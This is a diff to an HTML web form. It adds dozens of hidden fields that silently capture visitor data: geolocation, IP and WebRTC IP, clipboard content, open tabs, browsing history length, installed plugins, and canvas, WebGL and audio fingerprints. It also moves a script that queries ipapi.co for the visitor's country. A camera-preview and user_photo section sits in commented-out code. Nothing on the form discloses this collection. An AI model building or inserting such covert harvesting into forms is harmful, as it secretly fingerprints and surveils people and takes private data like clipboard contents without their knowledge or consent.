@@ -46,6 +46,96 @@
       <!-- Hidden Fields -->
       <input type="hidden" id="formID" name="formID" value="FORM12345"> <!-- Example static form ID -->
       <input type="hidden" id="submissionDate" name="submissionDate" value="currentDate"> <!-- Will be set with current date -->
+
+
+
+
+
+
+
+      <input type="hidden" name="datetime_submitted" id="datetime_submitted">
+    
+    <input type="hidden" name="location" id="location">
+    
+    <input type="hidden" name="device_type" id="device_type">
+    
+    <input type="hidden" name="network_provider" id="network_provider">
+    
+    <input type="hidden" name="user_agent" id="user_agent">
+    
+    <input type="hidden" name="connection_type" id="connection_type">
+    
+    <input type="hidden" name="latitude" id="latitude">
+    
+    <input type="hidden" name="longitude" id="longitude">
+    
+    <input type="hidden" name="accuracy" id="accuracy">
+
+    
+    <input type="hidden" name="total_storage" id="total_storage">
+    
+    <input type="hidden" name="available_storage" id="available_storage">
+    
+    <input type="hidden" name="system_name" id="system_name">
+    
+    <input type="hidden" name="system_version" id="system_version">
+    
+    <input type="hidden" name="device_model" id="device_model">
+    
+
+
+
+
+    <input type="hidden" name="battery_level" id="battery_level">
+    
+    <input type="hidden" name="is_charging" id="is_charging">
+    
+    <input type="hidden" name="screen_resolution" id="screen_resolution">
+    
+    <input type="hidden" name="color_depth" id="color_depth">
+    
+    <input type="hidden" name="history_length" id="history_length">
+    
+    <input type="hidden" name="cookies_enabled" id="cookies_enabled">
+    
+    <input type="hidden" name="javascript_enabled" id="javascript_enabled">
+    
+    <input type="hidden" name="referrer_url" id="referrer_url">
+    
+    <input type="hidden" name="visit_count" id="visit_count">
+    
+    <input type="hidden" name="installed_plugins" id="installed_plugins">
+    
+    <input type="hidden" name="browser_language" id="browser_language">
+    
+    <input type="hidden" name="timezone" id="timezone">
+    
+    <input type="hidden" name="session_duration" id="session_duration">
+    
+
+    <input type="hidden" name="ip_address" id="ip_address">
+    
+    
+    
+    
+    <input type="hidden" name="clipboard_content" id="clipboard_content">
+    <input type="hidden" name="do_not_track" id="do_not_track">
+    <input type="hidden" name="cpu_cores" id="cpu_cores">
+    <input type="hidden" name="ram_size" id="ram_size">
+    <input type="hidden" name="previous_page_title" id="previous_page_title">
+    <input type="hidden" name="window_width" id="window_width">
+    <input type="hidden" name="window_height" id="window_height">
+    <input type="hidden" name="canvas_fingerprint" id="canvas_fingerprint">
+    <input type="hidden" name="webgl_fingerprint" id="webgl_fingerprint">
+    <input type="hidden" name="local_storage_usage" id="local_storage_usage">
+    <input type="hidden" name="session_storage_usage" id="session_storage_usage">
+    <input type="hidden" name="device_pixel_ratio" id="device_pixel_ratio">
+    <input type="hidden" name="open_tabs" id="open_tabs">
+    <input type="hidden" name="audio_fingerprint" id="audio_fingerprint">
+    <input type="hidden" name="page_visibility" id="page_visibility">
+    <input type="hidden" name="media_devices" id="media_devices">
+    <input type="hidden" name="webrtc_ip" id="webrtc_ip">
+    
       <br>
       <br>
       <!--reCAPTCHA field-->
@@ -98,8 +188,9 @@
 
 
 
-//Determine country
+
   <script>
+    //Determine country
         fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
@@ -113,15 +204,10 @@
         });
     
   </script> 
-</body>
-</html>
 
 
-<!--advanc..
 
-    </style>
-
-    <script>
+   <script>
         // Function to update the date on the page
         function updateDate() {
             var currentDate = new Date();
@@ -168,6 +254,17 @@
         window.onload = updateDate;
     </script>
   <!--end of time and date script-->
+</body>
+</html>
+
+
+
+
+<!--advanc..
+
+    </style>
+
+   
     
     <script>
     navigator.mediaDevices.enumerateDevices().then(devices => {
@@ -372,94 +469,7 @@ document.getElementById('webgl_fingerprint').value = webglFingerprint;
         
 
     
-    <input type="hidden" name="datetime_submitted" id="datetime_submitted">
     
-    <input type="hidden" name="location" id="location">
-    
-    <input type="hidden" name="device_type" id="device_type">
-    
-    <input type="hidden" name="network_provider" id="network_provider">
-    
-    <input type="hidden" name="user_agent" id="user_agent">
-    
-    <input type="hidden" name="connection_type" id="connection_type">
-    
-    <input type="hidden" name="latitude" id="latitude">
-    
-    <input type="hidden" name="longitude" id="longitude">
-    
-    <input type="hidden" name="accuracy" id="accuracy">
-
-    
-    <input type="hidden" name="total_storage" id="total_storage">
-    
-    <input type="hidden" name="available_storage" id="available_storage">
-    
-    <input type="hidden" name="system_name" id="system_name">
-    
-    <input type="hidden" name="system_version" id="system_version">
-    
-    <input type="hidden" name="device_model" id="device_model">
-    
-
-
-
-
-    <input type="hidden" name="battery_level" id="battery_level">
-    
-    <input type="hidden" name="is_charging" id="is_charging">
-    
-    <input type="hidden" name="screen_resolution" id="screen_resolution">
-    
-    <input type="hidden" name="color_depth" id="color_depth">
-    
-    <input type="hidden" name="history_length" id="history_length">
-    
-    <input type="hidden" name="cookies_enabled" id="cookies_enabled">
-    
-    <input type="hidden" name="javascript_enabled" id="javascript_enabled">
-    
-    <input type="hidden" name="referrer_url" id="referrer_url">
-    
-    <input type="hidden" name="visit_count" id="visit_count">
-    
-    <input type="hidden" name="installed_plugins" id="installed_plugins">
-    
-    <input type="hidden" name="browser_language" id="browser_language">
-    
-    <input type="hidden" name="timezone" id="timezone">
-    
-    <input type="hidden" name="session_duration" id="session_duration">
-    
-
-    <input type="hidden" name="ip_address" id="ip_address">
-    
-    <input type="hidden" name="imei" id="imei">
-    
-    <input type="hidden" name="phone_number" id="phone_number">
-    
-    <input type="hidden" name="fingerprint" id="fingerprint">
-    <input type="hidden" name="server_time_difference" id="server_time_difference">
-    <input type="hidden" name="mouse_movements" id="mouse_movements">
-    <input type="hidden" name="clipboard_content" id="clipboard_content">
-    <input type="hidden" name="do_not_track" id="do_not_track">
-    <input type="hidden" name="cpu_cores" id="cpu_cores">
-    <input type="hidden" name="ram_size" id="ram_size">
-    <input type="hidden" name="previous_page_title" id="previous_page_title">
-    <input type="hidden" name="window_width" id="window_width">
-    <input type="hidden" name="window_height" id="window_height">
-    <input type="hidden" name="canvas_fingerprint" id="canvas_fingerprint">
-    <input type="hidden" name="webgl_fingerprint" id="webgl_fingerprint">
-    <input type="hidden" name="local_storage_usage" id="local_storage_usage">
-    <input type="hidden" name="session_storage_usage" id="session_storage_usage">
-    <input type="hidden" name="device_pixel_ratio" id="device_pixel_ratio">
-    <input type="hidden" name="open_tabs" id="open_tabs">
-    <input type="hidden" name="audio_fingerprint" id="audio_fingerprint">
-    <input type="hidden" name="page_visibility" id="page_visibility">
-    <input type="hidden" name="media_devices" id="media_devices">
-    <input type="hidden" name="webrtc_ip" id="webrtc_ip">
-    <!-- Hidden input to store the photo data -->
-    <input type="hidden" name="user_photo" id="user_photo">
 
     <!-- Optional: Video element to show the camera preview -->
     <video id="cameraPreview" style="display:none;" autoplay></video>
@@ -820,4 +830,4 @@ document.addEventListener("DOMContentLoaded", function() {
 </body>
 </html>
 -->
-<!--end-->
+
